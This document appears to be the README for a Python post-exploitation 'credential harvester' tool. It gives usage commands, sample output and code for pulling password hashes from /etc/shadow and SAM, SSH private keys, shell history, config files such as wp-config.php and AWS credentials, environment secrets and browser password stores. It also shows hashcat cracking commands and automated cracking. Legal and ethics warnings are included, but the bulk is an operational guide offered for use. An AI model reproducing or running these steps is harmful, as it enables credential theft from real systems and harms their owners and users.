"""
# Credential Harvesting Framework

Post-exploitation framework for extracting credentials from compromised systems.

## ⚠️ Legal Warning

**This tool is for authorized penetration testing and red team operations ONLY.**

- ✅ Only use on systems with explicit written authorization
- ✅ Follow all applicable laws and regulations
- ❌ Unauthorized access is illegal and unethical
- ❌ Tool misuse can result in criminal prosecution

## Installation

```bash
# Method 1: Install as package
pip install -e .

# Method 2: Run directly
python3 -m credential_harvester
```

## Usage

### Basic Usage
```bash
# Run full credential harvest
python3 -m credential_harvester

# Verbose mode
python3 -m credential_harvester --verbose

# Specify output directory
python3 -m credential_harvester --output-dir /tmp/results
```

### Programmatic Usage
```python
from credential_harvester import CredentialHarvester

# Create instance
harvester = CredentialHarvester()

# Run full harvest
harvester.run_full_harvest()

# Access results
print(harvester.credentials['passwords'])
print(harvester.credentials['hashes'])
print(harvester.credentials['keys'])
```

### Use Individual Harvesters
```python
from credential_harvester.harvesters import SSHKeyHarvester, HistoryHarvester

credentials = {'passwords': [], 'hashes': [], 'keys': [], 'tokens': []}

# Harvest only SSH keys
ssh = SSHKeyHarvester(credentials, 'posix')
ssh.harvest()

# Harvest only command history
history = HistoryHarvester(credentials, 'posix')
history.harvest()
```

## Module Structure

```
credential_harvester/
├── __init__.py                    # Package initialization
├── main.py                        # CLI entry point
├── core/
│   ├── __init__.py
│   ├── base.py                   # Main orchestrator
│   └── utils.py                  # Shared utilities
├── harvesters/
│   ├── __init__.py
│   ├── linux.py                  # Linux /etc/shadow
│   ├── windows.py                # Windows credential stores
│   ├── ssh.py                    # SSH private keys
│   ├── history.py                # Command history
│   ├── config.py                 # Configuration files
│   ├── env.py                    # Environment variables
│   └── browser.py                # Browser saved passwords
└── output/
    ├── __init__.py
    └── formatters.py             # Output formatting
```

## Features

### Linux Harvesting
- `/etc/shadow` password hashes
- Hash type identification (MD5, bcrypt, SHA-256, SHA-512, yescrypt)
- Automatic hashcat format output

### Windows Harvesting
- Windows Credential Manager
- Registry autologon credentials
- Unattend.xml files
- SAM database (when accessible)

### Cross-Platform Harvesting
- **SSH Keys**: Private keys from `.ssh` directories
- **Command History**: Bash/Zsh history files
- **Config Files**: Database configs, web app configs, cloud credentials
- **Environment Variables**: Sensitive env vars
- **Browser Data**: Chrome, Firefox, Edge password stores

## Harvesting Modules

### 1. SSH Key Harvester
Searches for SSH private keys in:
- `/home/*/.ssh/`
- `/root/.ssh/`
- `~/.ssh/`
- Windows user directories

### 2. History Harvester
Extracts credentials from:
- `.bash_history`
- `.zsh_history`
- PowerShell history

Detects patterns like:
- `mysql -u root -pPassword123`
- `export API_KEY=abc123`
- `--password=secret`

### 3. Config Harvester
Searches configuration files:
- `/etc/mysql/my.cnf`
- `/var/www/html/wp-config.php`
- `~/.aws/credentials`
- `~/.docker/config.json`
- Application config files

### 4. Environment Harvester
Checks environment variables for:
- `*PASSWORD*`
- `*SECRET*`
- `*TOKEN*`
- `*API_KEY*`
- `*AUTH*`

### 5. Browser Harvester
Locates browser credential stores:
- Chrome/Chromium Login Data
- Firefox profiles
- Edge credential stores

**Note**: Browser credentials are encrypted. Use tools like LaZagne or firefox_decrypt.py to extract.

## Output Files

### credentials_TIMESTAMP.json
Complete credential harvest in JSON format:
```json
{
  "passwords": [
    {
      "source": "/var/www/config.php",
      "type": "Configuration File",
      "credential": "db_P@ssw0rd"
    }
  ],
  "hashes": [
    {
      "source": "/etc/shadow",
      "username": "john",
      "hash": "$6$...",
      "type": "SHA-512"
    }
  ],
  "keys": [...],
  "tokens": [...],
  "cookies": [...]
}
```

### hashes_TIMESTAMP.txt
Hashcat-compatible hash file:
```
root:$6$xyz$abc123...
john:$6$abc$def456...
admin:$1$qwe$rty789...
```

Crack with:
```bash
# SHA-512 crypt
hashcat -m 1800 hashes_20251030.txt rockyou.txt

# MD5 crypt
hashcat -m 500 hashes_20251030.txt rockyou.txt

# bcrypt
hashcat -m 3200 hashes_20251030.txt rockyou.txt
```

## Examples

### Example 1: Full Harvest on Linux Server
```bash
python3 -m credential_harvester

# Output:
# [*] Attempting to read /etc/shadow...
#   [+] Found hash for: root
#   [+] Found hash for: admin
# [*] Searching for SSH keys...
#   [+] Found SSH key: /home/john/.ssh/id_rsa
# [*] Searching bash history...
#   [+] Found credential in: /home/john/.bash_history
# [+] Credentials saved to: credentials_20251030.json
# [+] Hashes saved to: hashes_20251030.txt
```

### Example 2: Target Specific Credential Types
```python
from credential_harvester.harvesters import ConfigHarvester, EnvHarvester

credentials = {'passwords': [], 'hashes': [], 'keys': [], 'tokens': []}

# Only harvest config files and environment variables
config = ConfigHarvester(credentials, 'posix')
config.harvest()

env = EnvHarvester(credentials)
env.harvest()

# Check results
for pwd in credentials['passwords']:
    print(f"{pwd['source']}: {pwd['credential']}")
```

### Example 3: Custom Harvester
```python
from credential_harvester.core.utils import safe_read_file, extract_credentials_with_patterns

# Read custom config file
content = safe_read_file('/opt/app/secrets.conf')

# Extract credentials
patterns = [r'token["\s]*[:=]["\s]*["\']([^"\']+)["\']']
creds = extract_credentials_with_patterns(content, patterns)

for cred in creds:
    print(f"Found: {cred['credential']}")
```

## Platform Support

- ✅ Linux (Ubuntu, CentOS, Debian, Kali, etc.)
- ✅ Windows (7, 8, 10, 11, Server)
- ⚠️ macOS (partial support)

## Requirements

- Python 3.7+
- Standard library only (no external dependencies)
- Root/Administrator privileges recommended for full access

## Best Practices

### 1. Run with Elevated Privileges
Many credential stores require root/admin access:
```bash
sudo python3 -m credential_harvester
```

### 2. Secure Output Files
Protect harvested credentials:
```bash
chmod 600 credentials_*.json
chmod 600 hashes_*.txt
```

### 3. Use on Authorized Systems Only
Always obtain written authorization before running credential harvesting tools.

### 4. Clean Up After Yourself
Remove output files after transferring to secure location:
```bash
shred -u credentials_*.json
shred -u hashes_*.txt
```

### 5. Test Credentials Responsibly
- Don't lock out accounts
- Check password policies first
- Use CrackMapExec for safe testing
- Document all credential usage

## Advanced Usage

### Custom Output Location
```python
from credential_harvester import CredentialHarvester
from credential_harvester.output.formatters import OutputFormatter

harvester = CredentialHarvester()
harvester.run_full_harvest()

# Save to custom location
import os
os.chdir('/secure/location')
formatter = OutputFormatter()
formatter.save(harvester.credentials)
```

### Filter Results
```python
from credential_harvester import CredentialHarvester

harvester = CredentialHarvester()
harvester.run_full_harvest()

# Get only high-value credentials
admin_creds = [
    pwd for pwd in harvester.credentials['passwords']
    if 'root' in pwd.get('source', '').lower() or 
       'admin' in pwd.get('source', '').lower()
]

print(f"Found {len(admin_creds)} admin credentials")
```

### Integration with Crackers
```python
from credential_harvester import CredentialHarvester
import subprocess

harvester = CredentialHarvester()
harvester.run_full_harvest()

# Automatically start cracking
if harvester.credentials['hashes']:
    hash_file = 'hashes_temp.txt'
    
    # Identify hash types and crack
    for hash_entry in harvester.credentials['hashes']:
        if hash_entry['type'] == 'SHA-512':
            subprocess.run([
                'hashcat', '-m', '1800', 
                hash_file, 'rockyou.txt'
            ])
```

## Troubleshooting

### "Permission Denied" Errors
Most credential stores require elevated privileges:
```bash
sudo python3 -m credential_harvester
```

### No Credentials Found
Check if you're running on the correct OS:
- Linux harvesters won't work on Windows
- Windows harvesters won't work on Linux
- Ensure files exist in expected locations

### Browser Credentials Not Extracted
Browser databases are encrypted. Use specialized tools:
- **Chrome/Chromium**: LaZagne, chrome-password-dumper
- **Firefox**: firefox_decrypt.py
- **All browsers**: LaZagne (cross-platform)

## Ethical Considerations

This tool provides powerful capabilities for credential extraction. Use responsibly:

### DO:
- ✅ Obtain written authorization before use
- ✅ Use only on systems within engagement scope
- ✅ Protect harvested credentials with encryption
- ✅ Report findings to authorized parties
- ✅ Delete credentials after engagement
- ✅ Follow data protection regulations

### DON'T:
- ❌ Use on unauthorized systems
- ❌ Share harvested credentials publicly
- ❌ Use credentials outside engagement scope
- ❌ Keep copies after engagement ends
- ❌ Test on production systems without approval

## Contributing

Contributions welcome! To add a new harvester:

1. Create new file in `harvesters/` directory
2. Inherit from base pattern
3. Implement `harvest()` method
4. Add to `harvesters/__init__.py`
5. Update tests

Example:
```python
# harvesters/docker.py
class DockerHarvester:
    def __init__(self, credentials: dict, os_type: str):
        self.credentials = credentials
        self.os_type = os_type
    
    def harvest(self):
        # Check Docker config.json for registry credentials
        pass
```

## License

[Your License Here]

## Disclaimer

This tool is provided for educational and authorized testing purposes only. The authors are not responsible for misuse or illegal use of this tool. Always obtain proper authorization before conducting security assessments.

---

**Remember**: One wrong decision can end your career and land you in prison. Always get authorization. Always act ethically.